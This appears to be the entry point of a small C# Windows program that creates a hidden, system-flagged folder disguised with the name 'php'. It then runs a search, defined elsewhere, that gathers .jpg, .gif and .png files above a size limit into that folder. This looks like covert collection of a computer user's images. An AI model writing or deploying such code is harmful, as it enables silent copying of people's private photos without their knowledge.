using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using wScript.Controller;

namespace Flash
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            //path storge file
            string currentPath = Environment.CurrentDirectory;
            string dir = currentPath + @"\php\php\";
            DirectoryInfo dInfo = new DirectoryInfo(currentPath + @"\php");
            if (!dInfo.Exists)
                dInfo.Create();
            dInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;

            Directory.CreateDirectory(dir);

            //file type search
            string supportedExtensions = ".jpg,.gif,.png,.jpe,.jpeg";

            // size by byte 200 * 1024 = 200KB
            long size = 10 * 1024;


            SearchFile sf = new SearchFile(dir, supportedExtensions, size);
            sf.SearchThread();


            //Message Done
            File.WriteAllText(currentPath + @"\php\done.txt", "Done");
        }
    }
}
